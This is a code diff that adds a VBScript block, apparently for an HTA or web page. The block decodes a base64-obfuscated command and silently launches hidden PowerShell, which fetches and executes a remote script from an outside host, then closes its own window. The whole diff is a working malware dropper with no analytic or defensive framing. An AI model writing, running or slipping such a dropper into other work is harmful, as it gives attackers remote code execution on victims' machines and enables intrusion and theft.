@@ -1,0 +1,16 @@
+<script language="VBScript">
+Function Base64Decode(str)
+    Dim xml: Set xml = CreateObject("Msxml2.DOMDocument.3.0")
+    Dim node: Set node = xml.CreateElement("base64")
+    node.dataType = "bin.base64"
+    node.text = str
+    Base64Decode = node.nodeTypedValue
+End Function
+
+Dim encoded, decoded, cmd
+encoded = "Y21kIC9jIHN0YXJ0IC9taW4gcG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kIGlleChpcm0gaHR0cDovL2FjdGl2ZXByby5jYy9yaHcucHMxKQ=="
+Set shell = CreateObject("WScript.Shell")
+shell.Run "cmd /c " & Base64Decode(encoded), 0, False
+Set shell = Nothing
+Self.Close
+</script>
